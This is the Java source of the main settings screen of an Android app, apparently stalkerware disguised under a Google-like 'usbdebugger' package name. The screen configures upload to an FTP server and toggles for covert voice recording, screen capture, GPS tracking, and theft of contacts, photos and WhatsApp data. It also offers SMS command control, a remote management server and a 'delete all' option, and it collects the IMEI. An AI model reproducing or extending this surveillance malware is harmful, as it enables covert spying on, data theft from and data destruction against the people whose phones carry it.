package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.text.InputType;
import android.view.SurfaceHolder;
import android.view.View;
import android.widget.CheckBox;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    public static SurfaceHolder mSurfaceHolder;

    private TextView ftpip_text;
    private TextView ftpport_text;
    private TextView ftpuser_text;
    private TextView ftppass_text;
    private TextView ftpfolder_text;
    private TextView gpsper_text;
    private TextView programm_text;
    private TextView filecount_text;
    private TextView dbcount_text;
    private TextView appnamelb;
    private TextView gpsintervallb;
    private TextView filecountlb;
    private TextView dbcountlb;
    private TextView serviceStatustext;

    private CheckBox ftpip_check;
    private CheckBox ftpport_check;
    private CheckBox ftpuser_check;
    private CheckBox ftppass_check;
    private CheckBox ftpfolder_check;
    private CheckBox gpsper_check;

    private Switch voice_switch;
    private Switch screen_switch;
    private Switch contacts_switch;
    private Switch gps_switch;
    private Switch dcim_switch;
    private Switch wasap_switch;
    private Switch blackscreen_switch;
    private Switch smsenable_switch;
    private Switch mobilenetwork_switch;
    private Switch remmanserver_switch;
    private Switch deleteAll_switch;

    private Timer statusTimer;
    private StatusTimerTask statusTimerTask;
    private boolean status;

    private final static String TAG = "MainActivity2";
    private String Status = "";
    private DBHelper dbh;
    private SQLiteDatabase db;
    private ArrayList tt = new ArrayList();
    private final ArrayList tt2 = new ArrayList();

    private static final int ALL_PERMISSIONS_REQUEST = 101;

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        requestPermissionsIfNecessary();

        for (int i = 0; i < 20; i++) {
            tt2.add(i, "");
        }
        if (statusTimer == null) {
            statusTimer = new Timer();
            statusTimerTask = new StatusTimerTask();
            statusTimer.schedule(statusTimerTask, 1000, 1000);
        }
        serviceStatustext = findViewById(R.id.serviceStatustext);

        ftpip_text = findViewById(R.id.ftpip_text);

        ftpport_text = findViewById(R.id.ftpport_text);
        ftpport_text.setRawInputType(InputType.TYPE_CLASS_NUMBER);

        ftpuser_text = findViewById(R.id.ftpuser_text);
        ftpuser_text.setRawInputType(InputType.TYPE_CLASS_TEXT);

        ftppass_text = findViewById(R.id.ftppass_text);
        ftppass_text.setRawInputType(InputType.TYPE_CLASS_TEXT);

        ftpfolder_text = findViewById(R.id.ftpfolder_text);
        ftpfolder_text.setRawInputType(InputType.TYPE_CLASS_TEXT);

        filecountlb = findViewById(R.id.filecountlb);
        filecount_text = findViewById(R.id.filecount_text);
        filecount_text.setRawInputType(InputType.TYPE_CLASS_NUMBER);

        dbcountlb = findViewById(R.id.dbcountlb);
        dbcount_text = findViewById(R.id.dbcount_text);
        dbcount_text.setRawInputType(InputType.TYPE_CLASS_NUMBER);

        gpsper_text = findViewById(R.id.gpsper_text);
        gpsper_text.setRawInputType(InputType.TYPE_CLASS_NUMBER);

        programm_text = findViewById(R.id.programm_text);
        programm_text.setRawInputType(InputType.TYPE_CLASS_TEXT);

        appnamelb = findViewById(R.id.appnamelb);
        gpsintervallb = findViewById(R.id.gpsintervallb);

        ftpip_check = findViewById(R.id.ftpip_check);
        ftpip_check.setOnClickListener(this);

        ftpport_check = findViewById(R.id.ftpport_check);
        ftpport_check.setOnClickListener(this);

        ftpuser_check = findViewById(R.id.ftpuser_check);
        ftpuser_check.setOnClickListener(this);

        ftppass_check = findViewById(R.id.ftppass_check);
        ftppass_check.setOnClickListener(this);

        ftpfolder_check = findViewById(R.id.ftpfolder_check);
        ftpfolder_check.setOnClickListener(this);

        gpsper_check = findViewById(R.id.gpsper_check);
        gpsper_check.setOnClickListener(this);

        voice_switch = findViewById(R.id.voice_switch);
        screen_switch = findViewById(R.id.screen_switch);
        contacts_switch = findViewById(R.id.contacts_switch);
        gps_switch = findViewById(R.id.gps_switch);
        dcim_switch = findViewById(R.id.dcim_switch);
        wasap_switch = findViewById(R.id.wasap_switch);
        blackscreen_switch = findViewById(R.id.blackscreen_switch);
        smsenable_switch = findViewById(R.id.smsenable_switch);
        mobilenetwork_switch = findViewById(R.id.mobilenetwork_switch);
        remmanserver_switch = findViewById(R.id.remmanserver_switch);
        deleteAll_switch = findViewById(R.id.deleteAll_switch);

        voice_switch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (voice_switch.isChecked()) {
                Status = "#1*";
                dbcount_text.setCursorVisible(true);
                dbcount_text.setFocusableInTouchMode(true);
                dbcount_text.requestFocus();
                dbcount_text.setEnabled(true);
                dbcountlb.setEnabled(true);

                filecount_text.setCursorVisible(true);
                filecount_text.setFocusableInTouchMode(true);
                filecount_text.requestFocus();
                filecountlb.setEnabled(true);
                filecount_text.setEnabled(true);
            } else {
                Status = "#1#";
                dbcountlb.setEnabled(false);
                dbcount_text.setEnabled(false);
                dbcount_text.setCursorVisible(false);
                dbcount_text.setFocusableInTouchMode(false);

                filecountlb.setEnabled(false);
                filecount_text.setEnabled(false);
                filecount_text.setCursorVisible(false);
                filecount_text.setFocusableInTouchMode(false);
            }
        });

        gps_switch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (gps_switch.isChecked()) {
                gpsintervallb.setEnabled(true);
                gpsper_check.setEnabled(true);
            } else {
                gpsintervallb.setEnabled(false);
                gpsper_check.setEnabled(false);
            }
        });
        screen_switch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (screen_switch.isChecked()) {
                programm_text.setCursorVisible(true);
                programm_text.setFocusableInTouchMode(true);
                programm_text.requestFocus();
                programm_text.setEnabled(true);
                programm_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
                appnamelb.setEnabled(true);
            } else {
                programm_text.setCursorVisible(false);
                programm_text.setFocusableInTouchMode(false);
                programm_text.setEnabled(false);
                programm_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
                appnamelb.setEnabled(false);
            }
        });

        dbh = new DBHelper(this);
        db = dbh.getWritableDatabase();
        dbh.onCreateParametrs(db);
        tt = dbh.SelectParametrs(db);

        if (tt != null && tt.size() > 1) {
            if (!tt.get(2).toString().equals("")) {
                ftpip_text.setText(EncryptDecryptStringWithAES.decrypt(tt.get(2).toString()));
            }
            if (!tt.get(3).toString().equals("")) {
                ftpport_text.setText(tt.get(3).toString());
            }
            if (!tt.get(4).toString().equals("")) {
                ftpfolder_text.setText(EncryptDecryptStringWithAES.decrypt(tt.get(4).toString()));
            }
            if (!tt.get(5).toString().equals("")) {
                ftpuser_text.setText(EncryptDecryptStringWithAES.decrypt(tt.get(5).toString()));
            }
            if (!tt.get(6).toString().equals("")) {
                ftppass_text.setText(EncryptDecryptStringWithAES.decrypt(tt.get(6).toString()));
            }
            if (tt.get(0).toString().equals("1")) {
                voice_switch.setChecked(true);
                filecountlb.setEnabled(true);
                filecount_text.setEnabled(true);
            } else {
                voice_switch.setChecked(false);
                filecountlb.setEnabled(false);
                filecount_text.setEnabled(false);
            }
            screen_switch.setChecked(tt.get(1).toString().equals("1"));
            if (tt.get(7).toString().equals("1")) {
                gps_switch.setChecked(true);
                gpsper_check.setEnabled(true);
                gpsper_text.setEnabled(true);
                gpsper_text.setText(tt.get(8).toString());
            } else {
                gpsper_check.setEnabled(false);
                gpsper_text.setEnabled(false);
                gps_switch.setChecked(false);
                gpsper_text.setText("1");
            }
            contacts_switch.setChecked(tt.get(9).toString().equals("1"));
            wasap_switch.setChecked(tt.get(10).toString().equals("1"));
            dcim_switch.setChecked(tt.get(11).toString().equals("1"));
            if (!tt.get(12).toString().equals("")) {
                programm_text.setText(EncryptDecryptStringWithAES.decrypt(tt.get(12).toString()));
            }
            blackscreen_switch.setChecked(tt.get(13).toString().equals("1"));
            smsenable_switch.setChecked(tt.get(14).toString().equals("1"));
            mobilenetwork_switch.setChecked(tt.get(15).toString().equals("1"));
            if (!tt.get(16).toString().equals("")) {
                filecount_text.setText(tt.get(16).toString());
            }
            if (tt.get(17).toString().equals("1")) {
                remmanserver_switch.setChecked(true);
            } else {
                if (tt.get(17).toString().equals("0")) {
                    remmanserver_switch.setChecked(false);
                }
            }
            if (!tt.get(18).toString().equals("")) {
                dbcount_text.setText(tt.get(18).toString());
            }
            deleteAll_switch.setChecked(tt.get(19).toString().equals("1"));
        }
    }

    private void requestPermissionsIfNecessary() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                String[] requestedPermissions = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS).requestedPermissions;
                List<String> permissionsToRequest = new ArrayList<>();
                for (String permission : requestedPermissions) {
                    if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                        permissionsToRequest.add(permission);
                    }
                }

                if (!permissionsToRequest.isEmpty()) {
                    ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), ALL_PERMISSIONS_REQUEST);
                }
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == ALL_PERMISSIONS_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, permissions[i] + " granted", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, permissions[i] + " denied", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    public void onClick(View v) {
        if (v == ftpip_check) {
            if (ftpip_check.isChecked()) {
                ftpip_text.setCursorVisible(true);
                ftpip_text.setFocusableInTouchMode(true);
                ftpip_text.requestFocus();
                ftpip_text.setEnabled(true);
                ftpip_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
            } else {
                ftpip_text.setCursorVisible(false);
                ftpip_text.setFocusableInTouchMode(false);
                ftpip_text.setEnabled(false);
                ftpip_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
            }
        }

        if (v == ftpport_check) {
            if (ftpport_check.isChecked()) {
                ftpport_text.setCursorVisible(true);
                ftpport_text.setFocusableInTouchMode(true);
                ftpport_text.requestFocus();
                ftpport_text.setEnabled(true);
                ftpport_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
            } else {
                ftpport_text.setCursorVisible(false);
                ftpport_text.setFocusableInTouchMode(false);
                ftpport_text.setEnabled(false);
                ftpport_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
            }
        }
        if (v == ftpuser_check) {
            if (ftpuser_check.isChecked()) {
                ftpuser_text.setCursorVisible(true);
                ftpuser_text.setFocusableInTouchMode(true);
                ftpuser_text.requestFocus();
                ftpuser_text.setEnabled(true);
                ftpuser_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
            } else {
                ftpuser_text.setCursorVisible(false);
                ftpuser_text.setFocusableInTouchMode(false);
                ftpuser_text.setEnabled(false);
                ftpuser_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
            }
        }
        if (v == ftppass_check) {
            if (ftppass_check.isChecked()) {
                ftppass_text.setCursorVisible(true);
                ftppass_text.setFocusableInTouchMode(true);
                ftppass_text.requestFocus();
                ftppass_text.setEnabled(true);
                ftppass_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
            } else {
                ftppass_text.setCursorVisible(false);
                ftppass_text.setFocusableInTouchMode(false);
                ftppass_text.setEnabled(false);
                ftppass_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
            }
        }
        if (v == ftpfolder_check) {
            if (ftpfolder_check.isChecked()) {
                ftpfolder_text.setCursorVisible(true);
                ftpfolder_text.setFocusableInTouchMode(true);
                ftpfolder_text.requestFocus();
                ftpfolder_text.setEnabled(true);
                ftpfolder_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
            } else {
                ftpfolder_text.setCursorVisible(false);
                ftpfolder_text.setFocusableInTouchMode(false);
                ftpfolder_text.setEnabled(false);
                ftpfolder_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
            }
        }
        if (v == gpsper_check) {
            if (gpsper_check.isChecked()) {
                gpsper_text.setCursorVisible(true);
                gpsper_text.setFocusableInTouchMode(true);
                gpsper_text.requestFocus();
                gpsper_text.setEnabled(true);
                gpsper_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
            } else {
                gpsper_text.setCursorVisible(false);
                gpsper_text.setFocusableInTouchMode(false);
                gpsper_text.setEnabled(false);
                gpsper_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
            }
        }
        if (v == filecount_text) {
            filecount_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
        } else {
            filecount_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
        }
        if (v == dbcount_text) {
            dbcount_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border));
        } else {
            dbcount_text.setBackground(ContextCompat.getDrawable(getApplicationContext(), R.drawable.custom_border_gray));
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    void Send_To_Receiver() {
        Intent intent = new Intent(this, BootDeviceReceiver.class);
        intent.setAction("REFRESH_THIS");

        if (voice_switch.isChecked()) {
            Status = "#1*"; // Make sure Status is set before sending
            tt2.set(0, "1");
            if (filecount_text.getText().toString().equals("")) {
                tt2.set(16, "200");
            } else {
                tt2.set(16, filecount_text.getText().toString());
            }
            if (dbcount_text.getText().toString().equals("") || dbcount_text.getText().toString().equals("0")) {
                tt2.set(18, "2880");
            } else {
                tt2.set(18, dbcount_text.getText().toString());
            }
        } else {
            Status = "#1#"; // Make sure Status is set before sending
            tt2.set(0, "0");
            tt2.set(16, "0");
            tt2.set(18, "2880");
        }
        if (screen_switch.isChecked()) {
            tt2.set(1, "1");
            if (!programm_text.getText().toString().equals("")) {
                tt2.set(12, EncryptDecryptStringWithAES.encrypt(programm_text.getText().toString()));
            } else {
                tt2.set(12, "");
            }
        } else {
            tt2.set(1, "0");
            tt2.set(12, "");
        }

        if (!ftpip_text.getText().toString().equals("")) {
            tt2.set(2, EncryptDecryptStringWithAES.encrypt(ftpip_text.getText().toString()));
        } else {
            tt2.set(2, "");
        }
        if (!ftpport_text.getText().toString().equals("")) {
            tt2.set(3, ftpport_text.getText().toString());
        } else {
            tt2.set(3, "");
        }
        if (!ftpfolder_text.getText().toString().equals("")) {
            tt2.set(4, EncryptDecryptStringWithAES.encrypt(ftpfolder_text.getText().toString()));
        } else {
            tt2.set(4, "");
        }
        if (!ftpuser_text.getText().toString().equals("")) {
            tt2.set(5, EncryptDecryptStringWithAES.encrypt(ftpuser_text.getText().toString()));
        } else {
            tt2.set(5, "");
        }
        if (!ftppass_text.getText().toString().equals("")) {
            tt2.set(6, EncryptDecryptStringWithAES.encrypt(ftppass_text.getText().toString()));
        } else {
            tt2.set(6, "");
        }
        if (gps_switch.isChecked()) {
            tt2.set(7, "1");
        } else {
            tt2.set(7, "0");
            tt2.set(8, "1");
        }
        if (!gpsper_text.getText().toString().equals("") && !gpsper_text.getText().toString().equals("0")) {
            tt2.set(8, gpsper_text.getText().toString());
        } else {
            tt2.set(8, "1");
        }
        if (contacts_switch.isChecked()) {
            tt2.set(9, "1");
        } else {
            tt2.set(9, "0");
        }
        if (wasap_switch.isChecked()) {
            tt2.set(10, "1");
        } else {
            tt2.set(10, "0");
        }
        if (dcim_switch.isChecked()) {
            tt2.set(11, "1");
        } else {
            tt2.set(11, "0");
        }

        if (blackscreen_switch.isChecked()) {
            tt2.set(13, "1");
        } else {
            tt2.set(13, "0");
        }
        if (smsenable_switch.isChecked()) {
            tt2.set(14, "1");
        } else {
            tt2.set(14, "0");
        }
        if (mobilenetwork_switch.isChecked()) {
            tt2.set(15, "1");
        } else {
            tt2.set(15, "0");
        }
        if (remmanserver_switch.isChecked()) {
            tt2.set(17, "1");
        } else {
            tt2.set(17, "0");
        }
        if (deleteAll_switch.isChecked()) {
            tt2.set(19, "1");
        } else {
            tt2.set(19, "0");
        }

        intent.putExtra("sms_body", Status);
        intent.putExtra("Array", tt2);
        sendBroadcast(intent);
    }

    @SuppressLint("HardwareIds")
    public String IMEI() {
        TelephonyManager tm = (TelephonyManager)
                getSystemService(TELEPHONY_SERVICE);
        String imeiNumber1 = "";
        TelephonyManager telephony = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        try {
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                imeiNumber1 = getDeviceId(this);
            } else {
                if (android.os.Build.VERSION.SDK_INT >= 21 && android.os.Build.VERSION.SDK_INT <= 25) {
                    imeiNumber1 = telephony.getDeviceId();
                }
            }

        } catch (SecurityException e) {
            return imeiNumber1;
        } catch (SQLException s) {
            return imeiNumber1;
        } catch (Exception ex) {
            return imeiNumber1;
        }
        return imeiNumber1;
    }

    private void setText(final TextView text, final String value, final String Colors) {
        runOnUiThread(() -> {
            text.setText(value);
            text.setTextColor(Color.parseColor(Colors));
        });
    }

    @SuppressLint("HardwareIds")
    public static String getDeviceId(Context context) {

        String deviceId = null;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            final TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (mTelephony.getDeviceId() != null) {
                deviceId = mTelephony.getDeviceId();
            }
        }

        return deviceId;
    }


    class StatusTimerTask extends TimerTask {
        @Override
        public void run() {
            status = MyService.getStat();
            try {
                if (status) {
                    setText(serviceStatustext, "Service is Running!!!", "#ff669900");
                } else {
                    setText(serviceStatustext, "Service not Running!!!", "#ffcc0000");
                }
            } catch (Exception ex) {
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onStop() {
        Send_To_Receiver();
        if (statusTimer != null) {
            statusTimer.cancel();
            statusTimer = null;
        }
        super.onStop();
        Status = "onStop";
    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onRestart() {
        super.onRestart();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
    }

}
